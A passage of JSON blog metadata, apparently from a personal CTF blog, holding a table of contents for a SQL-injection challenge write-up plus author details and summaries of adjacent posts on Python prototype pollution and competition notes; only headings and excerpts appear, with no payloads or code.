2019]随便注</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%B8%80%E9%A2%84%E5%A4%84%E7%90%86-SQL\"><span class=\"toc-text\">思路一预处理 SQL</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%BA%8C-%E7%8C%9C%E6%B5%8B%E5%8E%9F%E8%AF%AD%E5%8F%A5-%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D\"><span class=\"toc-text\">思路二 猜测原语句 修改表名</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%B8%89-handler%E4%BB%A3%E6%9B%BFselect\"><span class=\"toc-text\">思路三 handler代替select</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sql%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">sql与代码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GXYCTF-2019-BabySqli\"><span class=\"toc-text\">[GXYCTF 2019]BabySqli</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81\"><span class=\"toc-text\">查看源码</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%B5%8B%E8%AF%95%E5%AF%86%E7%A0%81%E5%AD%97%E6%AE%B5\"><span class=\"toc-text\">测试密码字段</span></a></li></ol></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"python原型链污染","uid":"968c5d6624aab9225eba1668a49a3a02","slug":"python原型链污染","date":"2024-11-12T12:07:29.000Z","updated":"2024-11-12T12:13:06.680Z","comments":true,"path":"api/articles/python原型链污染.json","keywords":null,"cover":"/image/7.png","text":"python变种原型链污染**dst.get(k)**： 这是在字典 dst 中查找键 k 对应的值。如果键 k 存在，则返回对应的值；如果键 k 不存在，则返...","permalink":"/post/python原型链污染","photos":[],"count_time":{"symbolsCount":"7.4k","symbolsTime":"7 mins."},"categories":[],"tags":[{"name":"ctf","slug":"ctf","count":7,"path":"api/tags/ctf.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"赛题总结1","uid":"befe7ebe5c3909555effd7c815dc781c","slug":"赛题总结1","date":"2024-10-31T08:36:49.000Z","updated":"2024-10-31T08:37:27.571Z","comments":true,"path":"api/articles/赛题总结1.json","keywords":null,"cover":"/image/9.jpg","text":"https://gz.imxbt.cn/games Ctf经验及其题目总结l 做题经验：不要忽略index.php** 和查看源代码 l robots.txt ...","permalink":"/post/赛题总结1","photos":[],"count_time":{"symbolsCount":"35k","symbolsTime":"32 mins."},"categories":[],"tags":[{"name":"赛题","slug":"赛题","count":3,"path":"api/tags/赛题.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}